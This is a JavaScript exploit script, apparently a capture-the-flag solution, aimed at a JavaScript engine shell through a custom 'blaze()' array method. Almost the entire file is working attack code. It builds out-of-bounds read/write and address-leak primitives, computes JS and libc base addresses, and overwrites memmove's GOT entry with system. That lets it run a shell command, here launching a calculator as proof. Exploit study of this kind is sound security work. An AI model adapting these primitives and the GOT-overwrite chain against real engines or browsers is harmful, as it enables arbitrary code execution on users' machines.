/**
 * 2019 @ Paulus Gandung Prakosa <paulus.gandung@digitalsekuriti.id>
 */

function no_op(expr) {}

var dis = new Array(0x1337, 0x1338, 0x1339);
var adj = new Uint8Array(8);

no_op(dis.blaze() == undefined);

load('utils.js');
load('int64.js');

// dis[9] = emptyElementsHeader + 0x10
// dis[11] = adjacent typed array byteLength
// dis[13] = typed array object base

// overwrite adjacent typed array byte length
dis[11] = 0x10000;

if (adj.byteLength != dis[11])
	throw Error("Cannot indirectly overwrite adjacent typed array byte length.");

var savedBase = dis[13];

function rawAccess(addr, lval)
{
	if (typeof addr == 'string')
		addr = new Int64(addr);

	var isReadMode = typeof lval == 'number';
	var length = !isReadMode ? lval.length : lval;

	dis[11] = length;
	dis[13] = addr.asDouble();

	if (isReadMode)
		return adj.slice(0, length);

	adj.set(lval);
}

function rawRead(addr, length)
{
	return rawAccess(addr, length);
}

function readPtr(addr)
{
	return new Int64(rawRead(addr, 8));
}

function writePtr(addr, data)
{
	rawAccess(addr, (new Int64(data)).bytes());
}

function addrOf(obj)
{
	dis[11] = 8;
	dis[13] = savedBase;
	dis[14] = obj;
	return Int64.fromJSValue(adj.slice(0, 8));
}

var adjAddr = addrOf(adj);
var eehAddr = Int64.fromDouble(dis[9]);
var jsBase = Sub(eehAddr, new Int64(0x1922dc8 + 0x10));

print("[*] adjacent typed array: " + adjAddr.toString());
print("[*] empty elements header + 0x10: " + eehAddr.toString());
print("[*] js base: " + jsBase.toString(0x10));

var mprotect_got = Add(jsBase, new Int64(0x1d99440));
var mprotect_libc = readPtr(mprotect_got);
var libc_base = Sub(mprotect_libc, 0x11bae0);
var libc_system = Add(libc_base, new Int64(0x4f440));

print("[*] mprotect(got.plt): " + mprotect_got.toString(0x10));
print("[*] mprotect(libc): " + mprotect_libc.toString(0x10));
print("[*] libc(base): " + libc_base.toString(0x10));
print("[*] system(libc): " + libc_system.toString(0x10));

var memmove_got = Add(jsBase, new Int64(0x1d99030));
var orig_memmove = readPtr(memmove_got);

writePtr(memmove_got, libc_system);

var command = "/snap/bin/gnome-calculator 2>/dev/null";
var arr = new Uint8Array(command.length + 1);

for (var i = 0; i < command.length; i++) {
	arr[i] = command.charCodeAt(i);
}

// make command array null-terminated
arr[i] = 0x00;

// trigger overwritten memmove got entry
// by calling this..
arr.copyWithin(0, 1);

// restore memmove got entry by
// put original memmove value..
writePtr(memmove_got, orig_memmove);
